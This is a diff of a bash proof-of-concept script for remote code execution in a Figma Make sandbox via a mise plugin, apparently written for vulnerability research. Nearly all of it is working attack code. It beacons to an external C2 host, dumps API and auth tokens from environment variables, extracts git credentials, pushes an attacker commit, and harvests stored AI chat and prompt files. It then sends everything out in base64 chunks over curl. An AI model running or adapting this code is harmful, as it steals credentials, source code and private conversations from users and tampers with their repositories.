@@ -1,15 +1,10 @@
 #!/bin/bash
 # =============================================================================
 # POC: Figma Make Sandbox RCE via .mise.toml plugin
-# Runs automatically during sandbox initialization (RunMiseInstall)
-# =============================================================================
 # Single-shot exfil: collects data, sends to C2, pushes git, exits cleanly.
-# No persistent process — mise completes normally, sandbox boots unnoticed.
 # =============================================================================
 
-# ---- ATTACKER CONFIG ----
 C2_URL="${C2_URL:-https://pockappex.loca.lt}"
-# -------------------------
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -26,115 +21,97 @@ P '============================================='
 P "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
 P "hostname: $(hostname)"
 P "whoami: $(whoami)"
-P "pid: $$ ppid: $PPID"
 P ''
 
 SANDBOX_ID="$(hostname)-$$"
 
-# =============================================================
-# 1. C2 BEACON (prove attacker connectivity)
-# =============================================================
-P '=== 1. C2 BEACON ==='
-P "C2 server: $C2_URL"
-P "Sandbox ID: $SANDBOX_ID"
+# === C2 BEACON ===
+P '=== C2 BEACON ==='
+P "C2: $C2_URL"
+P "Sandbox: $SANDBOX_ID"
 curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
   "$C2_URL/c2/poll?id=$SANDBOX_ID" >/dev/null 2>&1
-P "Beacon sent"
 P ''
 
-# =============================================================
-# 2. ENVIRONMENT / TOKENS
-# =============================================================
-P '=== 2. ENVIRONMENT / TOKENS ==='
-P ''
+# === TOKENS / CREDENTIALS (non-empty only) ===
+P '=== CAPTURED TOKENS ==='
 for VAR in ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL AI_GATEWAY_BASE_URL \
            MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL DEV_SERVER_TOKEN \
-           CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
            MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
-           MAKE_CACHED_PREVIEW_TOKEN FIGMA_CONTENT_API_ACCESS_KEY \
-           FIGMA_FILE_ID FIGMA_PUBLIC_URL FIGMA_DEPLOY_ID; do
+           FIGMA_FILE_ID FIGMA_PUBLIC_URL; do
   VAL="${!VAR}"
-  P "$VAR (${#VAL}c): $VAL"
-done
-P ''
-
-# =============================================================
-# 3. SOURCE CODE ACCESS (ugit credential + git write)
-# =============================================================
-P '=== 3. SOURCE CODE ACCESS ==='
-P ''
-P '--- ugit credential (GIT_CONFIG_SYSTEM) ---'
-P "GIT_CONFIG_SYSTEM=$GIT_CONFIG_SYSTEM"
-cat /home/foundry/gitconfig 2>/dev/null >&3 || cat /home/foundry/.gitconfig 2>/dev/null >&3 || P 'no gitconfig found'
-P ''
-P '--- git remote -v ---'
-cd "$PROJDIR" 2>/dev/null && git remote -v 2>/dev/null >&3 || P 'no remote'
-P ''
-P '--- git log (recent victim commits) ---'
-cd "$PROJDIR" 2>/dev/null && git log --oneline -10 2>/dev/null >&3 || P 'no log'
-P ''
-P '--- source file listing ---'
-find "$PROJDIR/src/" -type f 2>/dev/null | head -30 >&3 || P 'no src/'
-P ''
-
-# git push — prove write access
-cd "$PROJDIR" 2>/dev/null
-echo "pwned by attacker plugin at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > public/attacker-was-here.txt
-git add public/attacker-was-here.txt 2>/dev/null
-git commit -m "attacker code injection via mise plugin" 2>/dev/null
-git push 2>/dev/null
-P "git push: exit code $?"
-P ''
-
-# =============================================================
-# 4. CHAT MESSAGE / AI PROMPT EXFILTRATION
-# =============================================================
-P '=== 4. CHAT MESSAGE / AI PROMPT EXFILTRATION ==='
-P ''
-for DIR in /home/foundry/.claude /home/foundry/.claude/projects \
-           /home/foundry/.config/claude /workspaces/default/code/.claude \
-           /tmp /workspaces/default/session; do
-  if [ -d "$DIR" ]; then
-    P "--- $DIR ---"
-    find "$DIR" -maxdepth 2 \( -name '*.json' -o -name '*.jsonl' \) 2>/dev/null | while read F; do
-      SZ=$(stat -c%s "$F" 2>/dev/null || stat -f%z "$F" 2>/dev/null || echo '?')
-      P "  FILE: $F ($SZ bytes)"
-      if [ "$SZ" != "?" ] && [ "$SZ" -lt 100000 ] 2>/dev/null; then
-        if grep -lqE '"role"|"prompt"|"messages"|"content"' "$F" 2>/dev/null; then
-          P "  *** CONTAINS CHAT/PROMPT DATA ***"
-          P "  PREVIEW:"
-          head -c 500 "$F" >&3
-          P ''
-        fi
-      fi
-    done
+  [ -z "$VAL" ] && continue
+  if [ ${#VAL} -gt 80 ]; then
+    P "$VAR: ${VAL:0:80}...[${#VAL}c]"
+  else
+    P "$VAR: $VAL"
   fi
 done
 P ''
 
-# =============================================================
-# 5. EXFIL TO C2 (send collected data)
-# =============================================================
+# === SOURCE CODE ACCESS (ugit credential) ===
+P '=== SOURCE CODE ACCESS (ugit credential) ==='
+GITCFG="/home/foundry/gitconfig"
+[ ! -f "$GITCFG" ] && GITCFG="/home/foundry/.gitconfig"
+if [ -f "$GITCFG" ]; then
+  CRED=$(grep -A1 'extraHeader' "$GITCFG" 2>/dev/null | grep -oP 'Basic \K.*' || grep 'extraHeader' "$GITCFG" 2>/dev/null)
+  P "ugit credential: $CRED"
+fi
+P ''
+P "git remote:"
+cd "$PROJDIR" 2>/dev/null && git remote -v 2>/dev/null >&3 || P 'no remote'
+P ''
+P "source files:"
+find "$PROJDIR/src/" -type f 2>/dev/null >&3 || P 'no src/'
+P ''
+
+# === GIT PUSH (prove write access) ===
+P '=== GIT PUSH (code injection) ==='
+cd "$PROJDIR" 2>/dev/null
+echo "pwned by attacker plugin at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > public/attacker-was-here.txt
+git add public/attacker-was-here.txt 2>/dev/null
+git commit -m "attacker code injection via mise plugin" 2>/dev/null
+PUSH_OUT=$(git push 2>&1)
+P "git push: exit code $?"
+P "$PUSH_OUT"
+P ''
+
+# === CHAT / AI PROMPT EXFILTRATION ===
+P '=== VICTIM AI PROMPTS ==='
+for DIR in /workspaces/default/session /home/foundry/.claude; do
+  [ ! -d "$DIR" ] && continue
+  find "$DIR" -maxdepth 3 \( -name '*.json' -o -name '*.jsonl' \) 2>/dev/null | while read F; do
+    SZ=$(stat -c%s "$F" 2>/dev/null || stat -f%z "$F" 2>/dev/null || echo '?')
+    [ "$SZ" = "?" ] && continue
+    [ "$SZ" -gt 100000 ] 2>/dev/null && continue
+    grep -lqE '"prompt"|"messages"' "$F" 2>/dev/null || continue
+    P "FILE: $F ($SZ bytes)"
+    head -c 800 "$F" >&3
+    P ''
+  done
+done
+P ''
+
+P '============================================='
+P '  POC COMPLETE'
+P '============================================='
+
 exec 3>&-
 
 cp "$OUT" "$PUB/poc-exfil.txt" 2>/dev/null
 
-# Send exfil data to C2 in chunks (GET URL length safe)
+# Send to C2
 EXFIL_B64=$(base64 -w0 "$OUT" 2>/dev/null || base64 "$OUT" 2>/dev/null)
-# Split into 4KB chunks for GET requests
 CHUNK_SIZE=4000
 TOTAL=${#EXFIL_B64}
 I=0
-CHUNK_NUM=0
+N=0
 while [ $I -lt $TOTAL ]; do
   CHUNK="${EXFIL_B64:$I:$CHUNK_SIZE}"
   curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
-    "$C2_URL/c2/result?id=$SANDBOX_ID&chunk=$CHUNK_NUM&r=$CHUNK" >/dev/null 2>&1
+    "$C2_URL/c2/result?id=$SANDBOX_ID&chunk=$N&r=$CHUNK" >/dev/null 2>&1
   I=$((I + CHUNK_SIZE))
-  CHUNK_NUM=$((CHUNK_NUM + 1))
+  N=$((N + 1))
 done
 
 cat "$OUT"
-echo ""
-echo "=== EXFIL SENT TO C2 ($CHUNK_NUM chunks) ==="
-echo "=== POC COMPLETE — exiting cleanly ==="
